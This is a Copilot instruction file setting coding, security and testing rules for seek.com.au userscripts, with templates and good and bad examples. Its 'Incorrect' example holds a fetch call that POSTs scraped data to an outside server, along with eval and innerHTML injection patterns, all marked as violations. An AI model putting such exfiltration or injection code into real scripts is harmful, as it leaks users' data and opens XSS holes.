# Seek Userscripts Instructions

**Scope**: Files matching any of:
- Path pattern: `**/*.user.js`
- Contains metadata: `@match *seek.com.au*`
- Contains metadata: `@match *seek.com*`

**Priority**: Path-specific (higher than language-specific)  
**Languages**: JavaScript, TypeScript

---

## Purpose

Generate maintainable, secure, and testable Userscripts for the **seek.com.au** job search website. These scripts provide:

- UI/UX improvements (highlighting, filtering, custom styling)
- Automation for repetitive tasks (form filling, navigation)
- Data extraction for personal use (within ToS limits)
- Enhanced search and filtering capabilities

**Important**: All functionality must respect [seek.com.au Terms of Service](https://www.seek.com.au/terms) and avoid disrupting the platform or other users.

---

## Code Style

### Language & Syntax

- **JavaScript**: ES2022+ features (optional chaining, nullish coalescing, private fields)
- **TypeScript**: Use JSDoc type annotations or `.ts` files compiled to `.user.js`
- **Module pattern**: IIFE to avoid polluting global namespace
- **Strict mode**: Always use `'use strict';` or compile from ES modules

### Formatting & Linting

- **ESLint**: Use `eslint:recommended` + `eslint-plugin-security`
- **Prettier**: 2-space indent, single quotes, trailing commas where valid
- **Comments**: JSDoc for functions; inline comments for complex logic
- **Naming**: camelCase for variables/functions; PascalCase for classes

### Example Structure

```javascript
// ==UserScript==
// @name         Seek Enhanced Search
// @namespace    userscripts.seek
// @version      1.0.0
// @description  Adds advanced filtering to job search results
// @author       YourName
// @match        https://www.seek.com.au/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';
  
  /**
   * @typedef {Object} JobListing
   * @property {string} title
   * @property {number|null} salary
   * @property {string} location
   */
  
  /** @type {MutationObserver|null} */
  let observer = null;
  
  /**
   * Parses salary from job listing text
   * @param {string} text - Raw salary text
   * @returns {number|null} Parsed salary or null
   */
  function parseSalary(text) {
    // Implementation...
  }
  
  function init() {
    // Setup logic
  }
  
  function cleanup() {
    observer?.disconnect();
    observer = null;
  }
  
  window.addEventListener('beforeunload', cleanup);
  init();
})();
```

---

## Metadata / Manifest Headers

### Required Headers

```javascript
// @name         Descriptive Name (what it does)
// @namespace    userscripts.seek
// @version      X.Y.Z (semver)
// @description  One-line purpose description
// @author       YourName
// @match        https://www.seek.com.au/*
// @run-at       document-idle
```

### Optional Headers

```javascript
// @grant        none  // or GM_* functions if needed
// @require      https://... // external libraries (use sparingly)
// @icon         data:image/svg+xml,... // base64 SVG icon
// @updateURL    https://... // auto-update URL
// @downloadURL  https://... // download URL
```

### Grant Permissions

- **Prefer `@grant none`** — most secure, runs in page context
- **Use `@grant GM_*` only when necessary** (storage, XHR, clipboard)
- **Document why each grant is needed** — add comment above @grant line

---

## Security & Privacy

### Mandatory Rules

1. **No data exfiltration** — do not send scraped data to external servers
2. **No hardcoded credentials** — never include API keys, tokens, passwords
3. **Sanitize DOM input** — use `textContent` instead of `innerHTML` for untrusted data
4. **No `eval()` or `Function()`** — avoid dynamic code execution
5. **No remote script injection** — do not load scripts from CDNs unless absolutely necessary
6. **Respect robots.txt** — add comment with link to seek.com.au/robots.txt if script automates requests
7. **Check ToS compliance** — add comment with link to [seek.com.au/terms](https://www.seek.com.au/terms) for automation features

### Security Checklist

- [ ] All DOM manipulations use safe methods (`textContent`, `setAttribute`)
- [ ] No eval, innerHTML with untrusted content, or inline event handlers
- [ ] MutationObservers are disconnected on cleanup
- [ ] No sensitive data in console.log
- [ ] @grant permissions are minimal
- [ ] External dependencies are pinned to specific versions

### Example: Safe vs Unsafe

**✅ Safe**
```javascript
function updateJobTitle(element, title) {
  element.textContent = title; // Safe
  element.setAttribute('data-title', title); // Safe
}
```

**❌ Unsafe**
```javascript
function updateJobTitle(element, title) {
  element.innerHTML = '<b>' + title + '</b>'; // XSS risk
  eval('element.textContent = "' + title + '"'); // Code injection
}
```

---

## Performance Best Practices

### DOM Optimization

- **Cache selectors** — query once, reuse references
- **Debounce observers** — use 200-300ms debounce for MutationObserver callbacks
- **Disconnect observers** — when no longer needed (cleanup on navigation)
- **Use event delegation** — attach listeners to parent elements
- **Batch DOM updates** — use DocumentFragment for multiple insertions

### Example: Debounced Observer

```javascript
/**
 * Debounces a function
 * @param {Function} fn - Function to debounce
 * @param {number} delay - Delay in ms
 * @returns {Function} Debounced function
 */
function debounce(fn, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => fn.apply(this, args), delay);
  };
}

const observer = new MutationObserver(
  debounce((mutations) => {
    // Process mutations
  }, 200)
);
```

### Antipatterns to Avoid

- ❌ Polling with `setInterval` every 100ms — use MutationObserver
- ❌ Global `window` modifications — use IIFE or modules
- ❌ Synchronous XHR — use fetch or GM_xmlhttpRequest
- ❌ Querying entire document tree — use specific selectors

---

## Testing

### Unit Tests (Jest + jsdom)

Test pure logic functions (parsers, formatters, calculators) separately from DOM manipulation.

**Example test:**

```javascript
// __tests__/parseSalary.test.js
const { parseSalary } = require('../seek.user.js');

describe('parseSalary', () => {
  test('parses AUD salary with k suffix', () => {
    expect(parseSalary('$120k - $150k')).toBe(120000);
  });
  
  test('returns null for missing salary', () => {
    expect(parseSalary('Salary not specified')).toBeNull();
  });
  
  test('handles per annum format', () => {
    expect(parseSalary('$95,000 per annum')).toBe(95000);
  });
});
```

### E2E Smoke Tests (Playwright)

Test critical flows against a static HTML snapshot or staging page.

**Example:**

```javascript
// e2e/seek.spec.js
const { test, expect } = require('@playwright/test');

test('highlights high salary jobs', async ({ page }) => {
  await page.goto('file://' + __dirname + '/fixtures/seek-snapshot.html');
  await page.addScriptTag({ path: './seek.user.js' });
  
  const highlighted = await page.locator('.job-highlighted').count();
  expect(highlighted).toBeGreaterThan(0);
});
```

### Test Coverage Goals

- **Unit tests**: 80%+ coverage for utility functions
- **E2E tests**: 1-2 smoke tests for critical user flows
- **Manual testing**: Test on live site before each release

---

## Prompt Templates for Copilot

Copy-paste these prompts when asking Copilot to generate or refactor code.

### Generate New Userscript

```
Generate a Tampermonkey userscript for seek.com.au:
- Purpose: [specific functionality, e.g., "highlight job listings with salary > $100k"]
- Include: metadata headers, TypeScript types via JSDoc, MutationObserver with 200ms debounce
- Security: no data exfiltration, sanitize all DOM updates, use @grant none
- Tests: Jest unit tests for core logic functions
- Cleanup: disconnect observers on window.beforeunload
```

### Refactor Existing Code

```
Refactor the following userscript to:
- Remove global variables (use IIFE)
- Add proper cleanup (disconnect MutationObserver, remove event listeners)
- Add JSDoc type annotations for all functions
- Replace innerHTML with textContent where appropriate
- Include Jest unit tests for [specific functions]
- Follow seek-userscripts instruction guidelines
```

### Add Tests

```
Add Jest unit tests for the following functions in this userscript:
- parseSalary(text): should handle $Xk format, $X,XXX format, null cases
- formatLocation(location): should normalize suburb names
- isHighSalary(salary, threshold): should compare correctly
Include edge cases and use describe/test blocks.
```

### Add Feature

```
Add the following feature to this seek.com.au userscript:
- Feature: [description]
- Implementation: use MutationObserver, debounce 200ms
- UI: add controls to top-right corner with inline styles
- Storage: use localStorage (no @grant needed)
- Tests: add Jest tests for new logic
- Follow seek-userscripts security guidelines
```

---

## Examples: Correct vs Incorrect

### ✅ Correct: Full Userscript Skeleton

```javascript
// ==UserScript==
// @name         Seek Salary Highlighter
// @namespace    userscripts.seek
// @version      1.0.0
// @description  Highlights jobs with salary above threshold
// @author       YourName
// @match        https://www.seek.com.au/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';
  
  const SALARY_THRESHOLD = 100000;
  /** @type {MutationObserver|null} */
  let observer = null;
  
  /**
   * Parses salary from text
   * @param {string} text
   * @returns {number|null}
   */
  function parseSalary(text) {
    const match = text.match(/\$(\d+)k/);
    return match ? parseInt(match[1], 10) * 1000 : null;
  }
  
  /**
   * Highlights job elements with high salary
   * @param {Element[]} jobElements
   */
  function highlightJobs(jobElements) {
    jobElements.forEach(el => {
      const salaryText = el.querySelector('[data-testid="salary"]')?.textContent || '';
      const salary = parseSalary(salaryText);
      if (salary && salary >= SALARY_THRESHOLD) {
        el.style.backgroundColor = '#e8f5e9';
        el.style.borderLeft = '4px solid #4caf50';
      }
    });
  }
  
  /**
   * Debounces a function
   * @param {Function} fn
   * @param {number} delay
   * @returns {Function}
   */
  function debounce(fn, delay) {
    let timeoutId;
    return function(...args) {
      clearTimeout(timeoutId);
      timeoutId = setTimeout(() => fn.apply(this, args), delay);
    };
  }
  
  function init() {
    const jobList = document.querySelector('[data-testid="job-list"]');
    if (!jobList) return;
    
    // Initial pass
    highlightJobs(Array.from(jobList.querySelectorAll('[data-testid="job-card"]')));
    
    // Watch for new jobs
    observer = new MutationObserver(debounce(() => {
      highlightJobs(Array.from(jobList.querySelectorAll('[data-testid="job-card"]')));
    }, 200));
    
    observer.observe(jobList, { childList: true, subtree: true });
  }
  
  function cleanup() {
    observer?.disconnect();
    observer = null;
  }
  
  window.addEventListener('beforeunload', cleanup);
  
  // Wait for page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
```

### ❌ Incorrect: Multiple Violations

```javascript
// Missing proper metadata headers
// @name Seek Script

// Global pollution - no IIFE
var THRESHOLD = 100;
window.myData = [];

// Unsafe DOM manipulation
setInterval(function() { // Polling antipattern
  document.querySelectorAll('.job').forEach(function(job) {
    var salary = job.querySelector('.salary').innerHTML; // XSS risk
    job.innerHTML = '<b>Hacked: ' + salary + '</b>'; // Multiple issues
    
    // Data exfiltration
    fetch('https://myserver.com/collect', {
      method: 'POST',
      body: JSON.stringify({ salary: salary }) // Privacy violation
    });
  });
}, 100); // Too frequent, no debounce

// No cleanup, no error handling, no tests
```

**Issues in incorrect example:**
- Missing proper @namespace, @version, @description
- Global variables pollute window
- Uses setInterval polling instead of MutationObserver
- innerHTML creates XSS vulnerability
- Sends data to external server (privacy violation)
- No debouncing (performance issue)
- No cleanup function
- No error handling
- No tests

---

## How Copilot Should Choose This File

GitHub Copilot will automatically select this instruction file when:

1. **File path** matches `*.user.js` or `userscripts/**/*.js`
2. **File content** contains `@match *seek.com*` or `@match *seek.com.au*` metadata
3. **Explicitly referenced** in prompt: "Follow seek-userscripts instructions"

---

## CI/CD Integration (Future)

When setting up continuous integration:

### PR Checks

- ESLint + Prettier validation (fail on errors)
- Jest unit tests (fail on test failures)
- Security scan: eslint-plugin-security or custom rules for innerHTML, eval, fetch
- Markdownlint for documentation

### PR Template Checklist

```markdown
- [ ] Metadata headers complete (@name, @version, @description, @match)
- [ ] Security: no data exfiltration, no eval/innerHTML, minimal @grant
- [ ] Performance: debounced observers, cached selectors
- [ ] Tests: unit tests for logic functions
- [ ] Documentation: JSDoc for public functions
- [ ] Manual testing: verified on live seek.com.au
```

---

## Maintenance & Evolution

1. **Quarterly review**: Update examples and antipatterns
2. **Feedback loop**: Track common Copilot mistakes and add examples
3. **Version these instructions**: Add dates or version numbers to track changes
4. **Share templates**: Keep prompt templates up-to-date with new patterns

---

**Last updated**: February 9, 2026  
**Version**: 1.0.0
